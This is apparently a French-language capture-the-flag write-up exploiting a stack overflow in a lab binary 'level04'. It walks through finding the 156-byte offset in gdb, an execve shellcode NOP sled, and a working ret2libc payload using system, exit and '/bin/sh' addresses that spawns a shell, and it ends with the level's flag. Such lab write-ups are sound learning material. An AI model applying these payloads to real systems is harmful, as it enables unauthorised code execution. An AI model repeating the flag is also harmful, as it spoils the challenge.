python2 -c 'print "A" * 150 + "B" * 4 +  "C" * 4 + "D" * 2'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCC

pour suiver  gdb en mode child 

un break dans le child 

0x08048722 <+90>:    call   0x8048540 <prctl@plt>
0x08048727 <+95>:    movl   $0x0,0xc(%esp)
0x0804872f <+103>:   movl   $0x0,0x8(%esp)
0x08048737 <+111>:   movl   $0x0,0x4(%esp)
0x0804873f <+119>:   movl   $0x0,(%esp)
0x08048746 <+126>:   call   0x8048570 <ptrace@plt>
0x0804874b <+131>:   movl   $0x8048903,(%esp)
0x08048752 <+138>:   call   0x8048500 <puts@plt>
0x08048757 <+143>:   lea    0x20(%esp),%eax
0x0804875b <+147>:   mov    %eax,(%esp)
0x0804875e <+150>:   call   0x80484b0 <gets@plt>
0x08048763 <+155>:   jmp    0x804881a <main+338>

b *main+150

set follow-on-fork child << mise on mode suivi
set detach-on-fork off << on le mette pour  nous prevenir  d un nouveau child




Breakpoint 1, 0x0804875e in main ()
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDD

Program received signal SIGSEGV, Segmentation fault.
0x44444343 in ?? ()

44 = D 
43 = C 
CCDD
\x44\x44\x43\x43

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCC

padding = 156 debut  de l ecrasement  memoire


hypothese du  future  de paylod

A savoir  qu'on va utiliser un sled pour  s'assure du bon fonctinoment 

export SC=$(python -c 'print("\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68" + "\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')


python2 -c 'print  "A" * 156 + addr_shell_code'

ca  ne marche pas nous allon prendre une dircetion celle  de  ret2libc

on besoin  de l'addreess de syteme, exite et de "/bin/sh"

on gdb ./level4

start 

p system
0xf7e6aed0

p exit
0xf7e5eb70

pour  trouver  le  "/bin/sh"

on va recupe  d'adress de la libc 

0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so

puis on va chercher son offeset 

strings -tx /lib32/libc-2.15.so | grep "/bin/sh"
15d7ec /bin/sh

python
Python 2.7.3 (default, Jun 22 2015, 19:33:41)
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0xf7e2c000 + 0x15d7ec)
'0xf7f897ec'

(python2 -c 'print "A"* 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1]
+ "\xf7\xf8\x97\xec"[::-1]'; cat )| ./level04

flag  : 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN